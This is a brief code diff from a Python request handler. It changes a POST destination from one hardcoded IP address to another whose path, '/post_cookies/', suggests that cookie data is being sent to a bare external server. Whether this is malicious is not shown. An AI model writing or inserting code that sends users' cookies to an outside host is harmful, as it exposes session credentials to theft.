@@ -24,7 +24,7 @@ async def aws(r: Request):
 
     # sending data to AWS
     aws_response = requests.post(
-        url="http://3.98.147.51:5002/",
+        url="52.23.187.142:5000/post_cookies/",
         json=payload
     )
 
